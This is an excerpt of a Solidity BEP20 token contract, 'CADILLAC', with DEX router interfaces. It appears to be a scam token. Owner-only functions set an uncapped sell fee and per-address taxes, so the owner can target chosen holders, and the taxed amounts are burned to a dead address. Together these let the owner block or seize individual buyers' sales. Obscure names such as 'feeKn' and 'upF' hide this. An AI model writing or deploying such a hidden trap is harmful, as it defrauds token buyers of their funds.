...
interface IUniswapV2Factory {
    ...
    function feeKnTo() external view returns (address);
    function feeKnToSetter() external view returns (address);
    ...
    function setfeeKnTo(address) external;
    function setfeeKnToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeKnOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeKnOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeKnOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeKnOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeKnOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract CADILLAC is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeeKn = 0;

    uint256 private _defaultBuyfeeKn = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeeKn;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeeKn = _value;
    }

    function setSlipfeeKn(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeeKn[_address] = _value;
    }

    function getSlipfeeKn(address _address) external view onlyownar returns (uint256) {
        return _slipfeeKn[_address];
    }


    function setMAccountfeeKn(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeeKn(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeKnAmount = 0;

        if (rF) {
            uint256 tradefeeKn = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeeKn = _defaultSellfeeKn;
                }
                if (from == uniswapV2Pair) {

                    tradefeeKn = _defaultBuyfeeKn;
                }
            }
            if (_slipfeeKn[from] > 0) {
                tradefeeKn = _slipfeeKn[from];
            }

            tradefeeKnAmount = _Amount.mul(tradefeeKn).div(100);
        }


        if (tradefeeKnAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeKnAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeKnAmount);
            emit Transfer(from, _deadAddress, tradefeeKnAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeKnAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeKnAmount);
        emit Transfer(from, _to, _Amount - tradefeeKnAmount);
    }
